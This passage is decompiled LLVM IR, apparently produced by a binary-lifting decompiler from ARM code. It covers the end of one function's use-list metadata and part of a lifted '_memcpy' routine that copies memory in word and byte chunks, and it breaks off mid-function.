  uselistorder i32 %v0_edbc, { 1, 0 }
  uselistorder i32 %v3_ed98, { 2, 1, 0, 3 }
  uselistorder i32 %v0_ed88, { 1, 0 }
  uselistorder i32 %v3_ed70, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_ed94, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i32 (i16*)* @getc_unlocked, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_ede0, { 1, 0 }
  uselistorder label %dec_label_pc_eddc, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_edcc, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_ed70, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_edf0 = load i32, i32* %r1.global-to-local, align 4
  %v1_edf0 = load i32, i32* %r0.global-to-local, align 4
  %v2_edf0 = sub i32 %v0_edf0, %v1_edf0
  %v3_edf0 = icmp ult i32 %v0_edf0, %v1_edf0
  %v4_edf0 = xor i32 %v1_edf0, %v0_edf0
  %v5_edf0 = xor i32 %v2_edf0, %v0_edf0
  %v6_edf0 = and i32 %v5_edf0, %v4_edf0
  %v7_edf0 = icmp slt i32 %v6_edf0, 0
  store i1 %v7_edf0, i1* %cpsr_v.global-to-local, align 1
  %v8_edf0 = icmp slt i32 %v2_edf0, 0
  store i1 %v8_edf0, i1* %cpsr_n.global-to-local, align 1
  %v9_edf0 = icmp eq i32 %v0_edf0, %v1_edf0
  store i1 %v9_edf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_edf0, label %dec_label_pc_f044, label %dec_label_pc_edf8

dec_label_pc_edf8:                                ; preds = %entry
  br i1 %v9_edf0, label %.thread130, label %bb

.thread130:                                       ; preds = %bb154, %.thread129, %bb151, %dec_label_pc_edf8
  %merge = phi i32 [ %v0_edf0, %dec_label_pc_edf8 ], [ %v2_f0d8, %bb151 ], [ %v11_f0f4, %bb154 ], [ %v7_f0f4, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_edf8
  %v5_edfc = inttoptr i32 %v1_edf0 to i8*
  store i8* %v5_edfc, i8** %stack_var_-8, align 4
  %v8_edfc = load i32, i32* @lr, align 4
  %v0_ee00 = load i32, i32* @r2, align 4
  %v2_ee00 = add i32 %v0_ee00, -4
  store i32 %v2_ee00, i32* %r2.global-to-local, align 4
  %v4_ee00 = sub i32 3, %v0_ee00
  %v5_ee00 = and i32 %v4_ee00, %v0_ee00
  %v6_ee00 = icmp slt i32 %v5_ee00, 0
  store i1 %v6_ee00, i1* %cpsr_v.global-to-local, align 1
  %v7_ee00 = icmp slt i32 %v2_ee00, 0
  store i1 %v7_ee00, i1* %cpsr_n.global-to-local, align 1
  %v8_ee00 = icmp eq i32 %v0_ee00, 4
  store i1 %v8_ee00, i1* %cpsr_z.global-to-local, align 1
  %v5_ee04 = icmp slt i32 %v0_ee00, 4
  br i1 %v5_ee04, label %bb141, label %dec_label_pc_ee08

dec_label_pc_ee08:                                ; preds = %bb
  %v1_ee08 = urem i32 %v1_edf0, 4
  store i32 %v1_ee08, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_ee08 = icmp eq i32 %v1_ee08, 0
  store i1 %v2_ee08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee08, label %dec_label_pc_ee10, label %dec_label_pc_eebc

dec_label_pc_ee10:                                ; preds = %dec_label_pc_ee08
  %v1_ee10 = urem i32 %v0_edf0, 4
  store i32 %v1_ee10, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_ee10 = icmp eq i32 %v1_ee10, 0
  store i1 %v2_ee10, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_edf0 to i2
  br i1 %v2_ee10, label %dec_label_pc_ee18, label %dec_label_pc_eeec

dec_label_pc_ee18:                                ; preds = %dec_label_pc_ee10, %dec_label_pc_eee4
  %v0_ee3094 = phi i32 [ %v1_edf0, %dec_label_pc_ee10 ], [ %v0_f00c77, %dec_label_pc_eee4 ]
  %v0_ee2c93 = phi i32 [ %v0_edf0, %dec_label_pc_ee10 ], [ %v0_eee4, %dec_label_pc_eee4 ]
  %v0_ee18 = phi i32 [ %v2_ee00, %dec_label_pc_ee10 ], [ %v2_eedc, %dec_label_pc_eee4 ]
  %v1_ee18 = add i32 %v0_ee18, -8
  store i32 %v1_ee18, i32* %r2.global-to-local, align 4
  %v3_ee18 = sub i32 7, %v0_ee18
  %v4_ee18 = and i32 %v3_ee18, %v0_ee18
  %v5_ee18 = icmp slt i32 %v4_ee18, 0
  store i1 %v5_ee18, i1* %cpsr_v.global-to-local, align 1
  %v6_ee18 = icmp slt i32 %v1_ee18, 0
  store i1 %v6_ee18, i1* %cpsr_n.global-to-local, align 1
  %v7_ee18 = icmp eq i32 %v0_ee18, 8
  store i1 %v7_ee18, i1* %cpsr_z.global-to-local, align 1
  %v2_ee1c = xor i1 %v6_ee18, %v5_ee18
  br i1 %v2_ee1c, label %dec_label_pc_ee6c, label %dec_label_pc_ee20

dec_label_pc_ee20:                                ; preds = %dec_label_pc_ee18
  %v1_ee20 = add i32 %v0_ee18, -28
  store i32 %v1_ee20, i32* %r2.global-to-local, align 4
  %v3_ee20 = sub i32 27, %v0_ee18
  %v4_ee20 = and i32 %v3_ee20, %v1_ee18
  %v5_ee20 = icmp slt i32 %v4_ee20, 0
  store i1 %v5_ee20, i1* %cpsr_v.global-to-local, align 1
  %v6_ee20 = icmp slt i32 %v1_ee20, 0
  store i1 %v6_ee20, i1* %cpsr_n.global-to-local, align 1
  %v7_ee20 = icmp eq i32 %v1_ee18, 20
  store i1 %v7_ee20, i1* %cpsr_z.global-to-local, align 1
  %v2_ee24 = xor i1 %v6_ee20, %v5_ee20
  br i1 %v2_ee24, label %dec_label_pc_ee58, label %dec_label_pc_ee28

dec_label_pc_ee28:                                ; preds = %dec_label_pc_ee20
  %v0_ee28 = load i32, i32* @r4, align 4
  store i32 %v0_ee28, i32* %stack_var_-12, align 4
  br label %dec_label_pc_ee2c

dec_label_pc_ee2c:                                ; preds = %dec_label_pc_ee2c.dec_label_pc_ee2c_crit_edge, %dec_label_pc_ee28
  %v0_ee30 = phi i32 [ %v12_ee38, %dec_label_pc_ee2c.dec_label_pc_ee2c_crit_edge ], [ %v0_ee3094, %dec_label_pc_ee28 ]
  %v0_ee2c = phi i32 [ %v0_ee2c.pre, %dec_label_pc_ee2c.dec_label_pc_ee2c_crit_edge ], [ %v0_ee2c93, %dec_label_pc_ee28 ]
  %v1_ee2c = inttoptr i32 %v0_ee2c to i32*
  %v2_ee2c = load i32, i32* %v1_ee2c, align 4
  %v3_ee2c = add i32 %v0_ee2c, 4
  %v4_ee2c = inttoptr i32 %v3_ee2c to i32*
  %v5_ee2c = load i32, i32* %v4_ee2c, align 4
  store i32 %v5_ee2c, i32* %r4.global-to-local, align 4
  %v6_ee2c = add i32 %v0_ee2c, 8
  %v7_ee2c = inttoptr i32 %v6_ee2c to i32*
  %v8_ee2c = load i32, i32* %v7_ee2c, align 4
  store i32 %v8_ee2c, i32* %ip.global-to-local, align 4
  %v9_ee2c = add i32 %v0_ee2c, 12
  %v10_ee2c = inttoptr i32 %v9_ee2c to i32*
  %v11_ee2c = load i32, i32* %v10_ee2c, align 4
  store i32 %v11_ee2c, i32* %lr.global-to-local, align 4
  %v12_ee2c = add i32 %v0_ee2c, 16
  store i32 %v12_ee2c, i32* %r1.global-to-local, align 4
  %v1_ee30 = inttoptr i32 %v0_ee30 to i32*
  store i32 %v2_ee2c, i32* %v1_ee30, align 4
  %v3_ee30 = add i32 %v0_ee30, 4
  %v4_ee30 = inttoptr i32 %v3_ee30 to i32*
  %v5_ee30 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_ee30, i32* %v4_ee30, align 4
  %v6_ee30 = add i32 %v0_ee30, 8
  %v7_ee30 = inttoptr i32 %v6_ee30 to i32*
  %v8_ee30 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_ee30, i32* %v7_ee30, align 4
  %v9_ee30 = add i32 %v0_ee30, 12
  %v10_ee30 = inttoptr i32 %v9_ee30 to i32*
  %v11_ee30 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_ee30, i32* %v10_ee30, align 4
  %v12_ee30 = add i32 %v0_ee30, 16
  store i32 %v12_ee30, i32* %r0.global-to-local, align 4
  %v0_ee34 = load i32, i32* %r1.global-to-local, align 4
  %v1_ee34 = inttoptr i32 %v0_ee34 to i32*
  %v2_ee34 = load i32, i32* %v1_ee34, align 4
  store i32 %v2_ee34, i32* @r3, align 4
  %v3_ee34 = add i32 %v0_ee34, 4
  %v4_ee34 = inttoptr i32 %v3_ee34 to i32*
  %v5_ee34 = load i32, i32* %v4_ee34, align 4
  store i32 %v5_ee34, i32* %r4.global-to-local, align 4
  %v6_ee34 = add i32 %v0_ee34, 8
  %v7_ee34 = inttoptr i32 %v6_ee34 to i32*
  %v8_ee34 = load i32, i32* %v7_ee34, align 4
  store i32 %v8_ee34, i32* @ip, align 4
  %v9_ee34 = add i32 %v0_ee34, 12
  %v10_ee34 = inttoptr i32 %v9_ee34 to i32*
  %v11_ee34 = load i32, i32* %v10_ee34, align 4
  store i32 %v11_ee34, i32* %lr.global-to-local, align 4
  %v12_ee34 = add i32 %v0_ee34, 16
  store i32 %v12_ee34, i32* %r1.global-to-local, align 4
  %v1_ee38 = inttoptr i32 %v12_ee30 to i32*
  store i32 %v2_ee34, i32* %v1_ee38, align 4
  %v3_ee38 = add i32 %v0_ee30, 20
  %v4_ee38 = inttoptr i32 %v3_ee38 to i32*
  %v5_ee38 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_ee38, i32* %v4_ee38, align 4
  %v6_ee38 = add i32 %v0_ee30, 24
  %v7_ee38 = inttoptr i32 %v6_ee38 to i32*
  %v8_ee38 = load i32, i32* @ip, align 4
  store i32 %v8_ee38, i32* %v7_ee38, align 4
  %v9_ee38 = add i32 %v0_ee30, 28
  %v10_ee38 = inttoptr i32 %v9_ee38 to i32*
  %v11_ee38 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_ee38, i32* %v10_ee38, align 4
  %v12_ee38 = add i32 %v0_ee30, 32
  store i32 %v12_ee38, i32* %r0.global-to-local, align 4
  %v0_ee3c = load i32, i32* %r2.global-to-local, align 4
  %v1_ee3c = add i32 %v0_ee3c, -32
  store i32 %v1_ee3c, i32* %r2.global-to-local, align 4
  %v3_ee3c = sub i32 31, %v0_ee3c
  %v4_ee3c = and i32 %v3_ee3c, %v0_ee3c
  %v5_ee3c = icmp slt i32 %v4_ee3c, 0
  %v6_ee3c = icmp slt i32 %v1_ee3c, 0
  %v2_ee40 = xor i1 %v6_ee3c, %v5_ee3c
  br i1 %v2_ee40, label %dec_label_pc_ee44, label %dec_label_pc_ee2c.dec_label_pc_ee2c_crit_edge

dec_label_pc_ee2c.dec_label_pc_ee2c_crit_edge:    ; preds = %dec_label_pc_ee2c
  %v0_ee2c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ee2c

dec_label_pc_ee44:                                ; preds = %dec_label_pc_ee2c
  %v1_ee44 = add i32 %v0_ee3c, -16
  %v3_ee44 = add i32 %v0_ee3c, 2147483616
  %v4_ee44 = and i32 %v1_ee44, %v3_ee44
  %v5_ee44 = icmp slt i32 %v4_ee44, 0
  store i1 %v5_ee44, i1* %cpsr_v.global-to-local, align 1
  %v6_ee44 = icmp slt i32 %v1_ee44, 0
  store i1 %v6_ee44, i1* %cpsr_n.global-to-local, align 1
  %v7_ee44 = icmp eq i32 %v1_ee44, 0
  store i1 %v7_ee44, i1* %cpsr_z.global-to-local, align 1
  %v2_ee48 = xor i1 %v6_ee44, %v5_ee44
  br i1 %v2_ee48, label %bb138, label %bb137

bb137:                                            ; preds = %dec_label_pc_ee44
  %v3_ee48 = load i32, i32* %r1.global-to-local, align 4
  %v4_ee48 = inttoptr i32 %v3_ee48 to i32*
  %v5_ee48 = load i32, i32* %v4_ee48, align 4
  store i32 %v5_ee48, i32* @r3, align 4
  %v6_ee48 = add i32 %v3_ee48, 4
  %v7_ee48 = inttoptr i32 %v6_ee48 to i32*
  %v8_ee48 = load i32, i32* %v7_ee48, align 4
  store i32 %v8_ee48, i32* %r4.global-to-local, align 4
  %v9_ee48 = add i32 %v3_ee48, 8
  %v10_ee48 = inttoptr i32 %v9_ee48 to i32*
  %v11_ee48 = load i32, i32* %v10_ee48, align 4
  store i32 %v11_ee48, i32* @ip, align 4
  %v12_ee48 = add i32 %v3_ee48, 12
  %v13_ee48 = inttoptr i32 %v12_ee48 to i32*
  %v14_ee48 = load i32, i32* %v13_ee48, align 4
  store i32 %v14_ee48, i32* %lr.global-to-local, align 4
  %v15_ee48 = add i32 %v3_ee48, 16
  store i32 %v15_ee48, i32* %r1.global-to-local, align 4
  %v4_ee4c = inttoptr i32 %v12_ee38 to i32*
  store i32 %v5_ee48, i32* %v4_ee4c, align 4
  %v6_ee4c = add i32 %v0_ee30, 36
  %v7_ee4c = inttoptr i32 %v6_ee4c to i32*
  %v8_ee4c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_ee4c, i32* %v7_ee4c, align 4
  %v9_ee4c = add i32 %v0_ee30, 40
  %v10_ee4c = inttoptr i32 %v9_ee4c to i32*
  %v11_ee4c = load i32, i32* @ip, align 4
  store i32 %v11_ee4c, i32* %v10_ee4c, align 4
  %v12_ee4c = add i32 %v0_ee30, 44
  %v13_ee4c = inttoptr i32 %v12_ee4c to i32*
  %v14_ee4c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_ee4c, i32* %v13_ee4c, align 4
  %v15_ee4c = add i32 %v0_ee30, 48
  store i32 %v15_ee4c, i32* %r0.global-to-local, align 4
  %v3_ee50 = load i32, i32* %r2.global-to-local, align 4
  %v4_ee50 = add i32 %v3_ee50, -16
  store i32 %v4_ee50, i32* %r2.global-to-local, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_ee44, %bb137
  %v3_ee60102111 = phi i32 [ %v15_ee4c, %bb137 ], [ %v12_ee38, %dec_label_pc_ee44 ]
  %v0_ee58.pre = phi i32 [ %v4_ee50, %bb137 ], [ %v1_ee3c, %dec_label_pc_ee44 ]
  %v2_ee54 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_ee54, i32* @r4, align 4
  br label %dec_label_pc_ee58

dec_label_pc_ee58:                                ; preds = %dec_label_pc_ee20, %bb138
  %v3_ee60101 = phi i32 [ %v0_ee3094, %dec_label_pc_ee20 ], [ %v3_ee60102111, %bb138 ]
  %v0_ee58 = phi i32 [ %v1_ee20, %dec_label_pc_ee20 ], [ %v0_ee58.pre, %bb138 ]
  %v1_ee58 = add i32 %v0_ee58, 20
  store i32 %v1_ee58, i32* %r2.global-to-local, align 4
  %v3_ee58 = sub i32 0, %v0_ee58
  %v4_ee58 = and i32 %v1_ee58, %v3_ee58
  %v5_ee58 = icmp slt i32 %v4_ee58, 0
  store i1 %v5_ee58, i1* %cpsr_v.global-to-local, align 1
  %v6_ee58 = icmp slt i32 %v1_ee58, 0
  store i1 %v6_ee58, i1* %cpsr_n.global-to-local, align 1
  %v7_ee58 = icmp eq i32 %v1_ee58, 0
  store i1 %v7_ee58, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ee5c

dec_label_pc_ee5c:                                ; preds = %.thread115, %dec_label_pc_ee58
  %v0_ee6c.pre158 = phi i32 [ %v0_ee6c.pre, %.thread115 ], [ %v1_ee58, %dec_label_pc_ee58 ]
  %v3_ee60 = phi i32 [ %v3_ee6099116, %.thread115 ], [ %v3_ee60101, %dec_label_pc_ee58 ]
  %v1_ee64 = phi i1 [ %v1_ee68, %.thread115 ], [ %v5_ee58, %dec_label_pc_ee58 ]
  %v0_ee64 = phi i1 [ %v0_ee68, %.thread115 ], [ %v6_ee58, %dec_label_pc_ee58 ]
  %v2_ee5c = xor i1 %v1_ee64, %v0_ee64
  br i1 %v2_ee5c, label %.thread115, label %bb139

bb139:                                            ; preds = %dec_label_pc_ee5c
  %v3_ee5c = load i32, i32* %r1.global-to-local, align 4
  %v4_ee5c = inttoptr i32 %v3_ee5c to i32*
  %v5_ee5c = load i32, i32* %v4_ee5c, align 4
  store i32 %v5_ee5c, i32* @r3, align 4
  %v6_ee5c = add i32 %v3_ee5c, 4
  %v7_ee5c = inttoptr i32 %v6_ee5c to i32*
  %v8_ee5c = load i32, i32* %v7_ee5c, align 4
  store i32 %v8_ee5c, i32* @ip, align 4
  %v9_ee5c = add i32 %v3_ee5c, 8
  %v10_ee5c = inttoptr i32 %v9_ee5c to i32*
  %v11_ee5c = load i32, i32* %v10_ee5c, align 4
  store i32 %v11_ee5c, i32* %lr.global-to-local, align 4
  %v12_ee5c = add i32 %v3_ee5c, 12
  store i32 %v12_ee5c, i32* %r1.global-to-local, align 4
  %v4_ee60 = inttoptr i32 %v3_ee60 to i32*
  store i32 %v5_ee5c, i32* %v4_ee60, align 4
  %v6_ee60 = add i32 %v3_ee60, 4
  %v7_ee60 = inttoptr i32 %v6_ee60 to i32*
  %v8_ee60 = load i32, i32* @ip, align 4
  store i32 %v8_ee60, i32* %v7_ee60, align 4
  %v9_ee60 = add i32 %v3_ee60, 8
  %v10_ee60 = inttoptr i32 %v9_ee60 to i32*
  %v11_ee60 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_ee60, i32* %v10_ee60, align 4
  %v12_ee60 = add i32 %v3_ee60, 12
  store i32 %v12_ee60, i32* %r0.global-to-local, align 4
  %v3_ee64 = load i32, i32* %r2.global-to-local, align 4
  %v4_ee64 = add i32 %v3_ee64, -12
  store i32 %v4_ee64, i32* %r2.global-to-local, align 4
  %v6_ee64 = sub i32 11, %v3_ee64
  %v7_ee64 = and i32 %v6_ee64, %v3_ee64
  %v8_ee64 = icmp slt i32 %v7_ee64, 0
  store i1 %v8_ee64, i1* %cpsr_v.global-to-local, align 1
  %v9_ee64 = icmp slt i32 %v4_ee64, 0
  store i1 %v9_ee64, i1* %cpsr_n.global-to-local, align 1
  %v10_ee64 = icmp eq i32 %v3_ee64, 12
  store i1 %v10_ee64, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_ee5c, %bb139
  %v0_ee6c.pre = phi i32 [ %v4_ee64, %bb139 ], [ %v0_ee6c.pre158, %dec_label_pc_ee5c ]
  %v3_ee6099116 = phi i32 [ %v12_ee60, %bb139 ], [ %v3_ee60, %dec_label_pc_ee5c ]
  %v1_ee68 = phi i1 [ %v8_ee64, %bb139 ], [ %v1_ee64, %dec_label_pc_ee5c ]
  %v0_ee68 = phi i1 [ %v9_ee64, %bb139 ], [ %v0_ee64, %dec_label_pc_ee5c ]
  %v2_ee68 = xor i1 %v1_ee68, %v0_ee68
  br i1 %v2_ee68, label %dec_label_pc_ee6c, label %dec_label_pc_ee5c

dec_label_pc_ee6c:                                ; preds = %.thread115, %dec_label_pc_ee18
  %v4_ee7c = phi i32 [ %v0_ee3094, %dec_label_pc_ee18 ], [ %v3_ee6099116, %.thread115 ]
  %v0_ee6c = phi i32 [ %v1_ee18, %dec_label_pc_ee18 ], [ %v0_ee6c.pre, %.thread115 ]
  %v1_ee6c = add i32 %v0_ee6c, 8
  store i32 %v1_ee6c, i32* %r2.global-to-local, align 4
  %v3_ee6c = sub i32 0, %v0_ee6c
  %v4_ee6c = and i32 %v1_ee6c, %v3_ee6c
  %v5_ee6c = icmp slt i32 %v4_ee6c, 0
  store i1 %v5_ee6c, i1* %cpsr_v.global-to-local, align 1
  %v6_ee6c = icmp slt i32 %v1_ee6c, 0
  store i1 %v6_ee6c, i1* %cpsr_n.global-to-local, align 1
  %v7_ee6c = icmp eq i32 %v1_ee6c, 0
  store i1 %v7_ee6c, i1* %cpsr_z.global-to-local, align 1
  %v2_ee70 = xor i1 %v6_ee6c, %v5_ee6c
  br i1 %v2_ee70, label %bb141, label %dec_label_pc_ee74

dec_label_pc_ee74:                                ; preds = %dec_label_pc_ee6c
  %v1_ee74 = add i32 %v0_ee6c, 4
  store i32 %v1_ee74, i32* %r2.global-to-local, align 4
  %v3_ee74 = sub i32 -5, %v0_ee6c
  %v4_ee74 = and i32 %v3_ee74, %v1_ee6c
  %v5_ee74 = icmp slt i32 %v4_ee74, 0
  store i1 %v5_ee74, i1* %cpsr_v.global-to-local, align 1
  %v6_ee74 = icmp slt i32 %v1_ee74, 0
  store i1 %v6_ee74, i1* %cpsr_n.global-to-local, align 1
  %v7_ee74 = icmp eq i32 %v1_ee6c, 4
  store i1 %v7_ee74, i1* %cpsr_z.global-to-local, align 1
  %v2_ee78 = xor i1 %v6_ee74, %v5_ee74
  %v3_ee78 = load i32, i32* %r1.global-to-local, align 4
  %v4_ee78 = inttoptr i32 %v3_ee78 to i32*
  %v5_ee78 = load i32, i32* %v4_ee78, align 4
  store i32 %v5_ee78, i32* @r3, align 4
  %v7_ee78 = add i32 %v3_ee78, 4
  br i1 %v2_ee78, label %.thread122, label %bb140

.thread122:                                       ; preds = %dec_label_pc_ee74
  store i32 %v7_ee78, i32* %r1.global-to-local, align 4
  %v5_ee7c = inttoptr i32 %v4_ee7c to i32*
  store i32 %v5_ee78, i32* %v5_ee7c, align 4
  %v6_ee7c = load i32, i32* %r0.global-to-local, align 4
  %v7_ee7c = add i32 %v6_ee7c, 4
  store i32 %v7_ee7c, i32* %r0.global-to-local, align 4
  %v0_ee8c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb141

bb140:                                            ; preds = %dec_label_pc_ee74
  %v7_ee80 = inttoptr i32 %v7_ee78 to i32*
  %v8_ee80 = load i32, i32* %v7_ee80, align 4
  store i32 %v8_ee80, i32* @ip, align 4
  %v9_ee80 = add i32 %v3_ee78, 8
  store i32 %v9_ee80, i32* %r1.global-to-local, align 4
  %v4_ee84 = inttoptr i32 %v4_ee7c to i32*
  store i32 %v5_ee78, i32* %v4_ee84, align 4
  %v6_ee84 = add i32 %v4_ee7c, 4
  %v7_ee84 = inttoptr i32 %v6_ee84 to i32*
  %v8_ee84 = load i32, i32* @ip, align 4
  store i32 %v8_ee84, i32* %v7_ee84, align 4
  %v9_ee84 = add i32 %v4_ee7c, 8
  store i32 %v9_ee84, i32* %r0.global-to-local, align 4
  %v3_ee88 = load i32, i32* %r2.global-to-local, align 4
  %v4_ee88 = add i32 %v3_ee88, -4
  store i32 %v4_ee88, i32* %r2.global-to-local, align 4
  br label %bb141

bb141:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_ee6c, %bb, %dec_label_pc_f03c, %dec_label_pc_efd0, %dec_label_pc_ef64, %bb140
  %v0_ee8c = phi i32 [ %v0_ee8c.pre, %.thread122 ], [ %v2_eedc, %.thread128 ], [ %v1_ee6c, %dec_label_pc_ee6c ], [ %v2_ee00, %bb ], [ %v0_ee8c61, %dec_label_pc_f03c ], [ %v0_ee8c60, %dec_label_pc_efd0 ], [ %v0_ee8c59, %dec_label_pc_ef64 ], [ %v4_ee88, %bb140 ]
  %v1_ee8c = add i32 %v0_ee8c, 4
  store i32 %v1_ee8c, i32* %r2.global-to-local, align 4
  %v3_ee8c = sub i32 0, %v0_ee8c
  %v4_ee8c = and i32 %v1_ee8c, %v3_ee8c
  %v5_ee8c = icmp slt i32 %v4_ee8c, 0
  store i1 %v5_ee8c, i1* %cpsr_v.global-to-local, align 1
  %v6_ee8c = icmp slt i32 %v1_ee8c, 0
  store i1 %v6_ee8c, i1* %cpsr_n.global-to-local, align 1
  %v7_ee8c = icmp eq i32 %v1_ee8c, 0
  store i1 %v7_ee8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee8c, label %bb142, label %bb141.bb143_crit_edge

bb141.bb143_crit_edge:                            ; preds = %bb141
  %v0_ee94.pre = load i32, i32* @r3, align 4
  br label %bb143

bb142:                                            ; preds = %bb141
  %v3_ee90 = load i8*, i8** %stack_var_-8, align 4
  %v4_ee90 = ptrtoint i8* %v3_ee90 to i32
  store i32 %v4_ee90, i32* %r0.global-to-local, align 4
  br label %bb143

bb143:                                            ; preds = %bb141.bb143_crit_edge, %bb142
  %v0_ee94 = phi i32 [ %v0_ee94.pre, %bb141.bb143_crit_edge ], [ %v8_edfc, %bb142 ]
  call void @__pseudo_cond_branch(i1 %v7_ee8c, i32 %v0_ee94)
  %v0_ee98 = load i32, i32* %r2.global-to-local, align 4
  %v1_ee98 = add i32 %v0_ee98, -2
  %v3_ee98 = sub i32 1, %v0_ee98
  %v4_ee98 = and i32 %v3_ee98, %v0_ee98
  %v5_ee98 = icmp slt i32 %v4_ee98, 0
  store i1 %v5_ee98, i1* %cpsr_v.global-to-local, align 1
  %v6_ee98 = icmp slt i32 %v1_ee98, 0
  store i1 %v6_ee98, i1* %cpsr_n.global-to-local, align 1
  %v7_ee98 = icmp eq i32 %v0_ee98, 2
  store i1 %v7_ee98, i1* %cpsr_z.global-to-local, align 1
  %v0_ee9c = load i32, i32* %r1.global-to-local, align 4
  %v1_ee9c = inttoptr i32 %v0_ee9c to i8*
  %v2_ee9c = load i8, i8* %v1_ee9c, align 1
  %v5_ee9c = add i32 %v0_ee9c, 1
  store i32 %v5_ee9c, i32* %r1.global-to-local, align 4
  %v2_eea0 = load i32, i32* %r0.global-to-local, align 4
  %v3_eea0 = inttoptr i32 %v2_eea0 to i8*
  store i8 %v2_ee9c, i8* %v3_eea0, align 1
  %v4_eea0 = load i32, i32* %r0.global-to-local, align 4
  %v5_eea0 = add i32 %v4_eea0, 1
  store i32 %v5_eea0, i32* %r0.global-to-local, align 4
  %v0_eea4 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_eea4 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_eea4 = xor i1 %v0_eea4, %v1_eea4
  br i1 %v2_eea4, label %.thread125, label %bb144

bb144:                                            ; preds = %bb143
  %v3_eea4 = load i32, i32* %r1.global-to-local, align 4
  %v4_eea4 = inttoptr i32 %v3_eea4 to i8*
  %v5_eea4 = load i8, i8* %v4_eea4, align 1
  %v8_eea4 = add i32 %v3_eea4, 1
  store i32 %v8_eea4, i32* %r1.global-to-local, align 4
  %v6_eea8 = inttoptr i32 %v5_eea0 to i8*
  store i8 %v5_eea4, i8* %v6_eea8, align 1
  %v7_eea8 = load i32, i32* %r0.global-to-local, align 4
  %v8_eea8 = add i32 %v7_eea8, 1
  store i32 %v8_eea8, i32* %r0.global-to-local, align 4
  %v1_eeac.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_eeac.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb143, %bb144
  %v7_eeb0 = phi i32 [ %v8_eea8, %bb144 ], [ %v5_eea0, %bb143 ]
  %v2_eeb0 = phi i1 [ %v2_eeac.pre, %bb144 ], [ %v1_eea4, %bb143 ]
  %v1_eeb0 = phi i1 [ %v1_eeac.pre, %bb144 ], [ %v0_eea4, %bb143 ]
  %v0_eeac = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_eeac = xor i1 %v2_eeb0, %v1_eeb0
  %v4_eeac = or i1 %v0_eeac, %v3_eeac
  br i1 %v4_eeac, label %.thread126, label %bb145

bb145:                                            ; preds = %.thread125
  %v5_eeac = load i32, i32* %r1.global-to-local, align 4
  %v6_eeac = inttoptr i32 %v5_eeac to i8*
  %v7_eeac = load i8, i8* %v6_eeac, align 1
  %v10_eeac = add i32 %v5_eeac, 1
  store i32 %v10_eeac, i32* %r1.global-to-local, align 4
  %v8_eeb0 = inttoptr i32 %v7_eeb0 to i8*
  store i8 %v7_eeac, i8* %v8_eeb0, align 1
  %v9_eeb0 = load i32, i32* %r0.global-to-local, align 4
  %v10_eeb0 = add i32 %v9_eeb0, 1
  store i32 %v10_eeb0, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb145
  %v2_eeb4 = load i8*, i8** %stack_var_-8, align 4
  %v3_eeb4 = ptrtoint i8* %v2_eeb4 to i32
  store i32 %v3_eeb4, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v8_edfc)
  %v0_eebc.pre = load i32, i32* @ip, align 4
  %v0_eec4.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_eec8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_eebc

